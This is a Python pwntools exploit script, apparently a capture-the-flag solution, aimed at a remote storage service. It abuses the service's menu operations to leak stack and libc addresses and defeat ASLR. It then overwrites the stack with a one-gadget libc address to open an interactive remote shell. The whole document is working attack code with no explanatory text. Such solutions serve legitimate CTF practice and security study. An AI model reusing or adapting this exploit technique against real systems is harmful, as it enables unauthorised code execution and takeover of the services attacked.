from pwn import *

offset = 0x7fef48
debug = False

if debug == True:
    r = process("./service")
    context(terminal = ["tmux", "splitw"])
    gdb.attach(r, """
        c
        """)
else:
    r = remote("storage.tghack.no", 1337)

def register():
    r.sendline("1")
    r.recvuntil(">")

def upload(data):
    r.sendline("2")
    r.recvuntil("Size: ")
    r.sendline(str(len(data)))
    r.recvuntil("Data: ")
    r.send(data)
    r.recvuntil(">")

def update(data):
    r.sendline("4")
    r.recvuntil("Data: ")
    r.send(data)
    r.recvuntil(">")

def delete():
    r.sendline("6")
    r.recvuntil(">")

def store():
    r.sendline("5")
    r.recvuntil(") ")
    r.sendline("24")
    r.recvuntil(">")

def show(start, stop=0):
    ret = []
    r.sendline("3")
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("start:")
    r.sendline(str(start))
    r.recvuntil("stop:")
    if stop == 0:
        stop = start + 1
    r.sendline(str(stop))

    for i in range(start, stop):
        r.recvuntil(": ")
        addr = r.recvline()
        ret.append(int(addr, 10))

    r.recvuntil(">")
    return ret

size = (1024 * 1024 * 8)
data = "A"* size

register()
upload(data)
delete()
store()

s = offset / 8
s += 22 # clone+109

__import__("time").sleep(1)

leak = show(s, s + 0x20)
print [hex(l) for l in leak]
log.info("leak: {}".format(hex(leak[0])))
leak = int(hex(leak[0]), 16)

# offset to libc from leak 
libc_off = 0x10741d
libc_base = leak - libc_off
log.info("libc base: {}".format(hex(libc_base)))

assert (offset % 8) == 0

tmp = offset / 8

oneshot = p64(libc_base + 0xcd1c8)

stack_vals = show(tmp - 200, tmp)
pad = "A"*(offset - (200 * 8))
data = pad
data += "".join(p64(n) for n in stack_vals)
#data += "C"*8
data += oneshot
stack_vals = show(tmp + 1, tmp + 500)
data += "".join(p64(n) for n in stack_vals)
data += "A"*(size - len(data))

update(data)

log.success("getting shell")
r.sendline("7")

r.interactive()
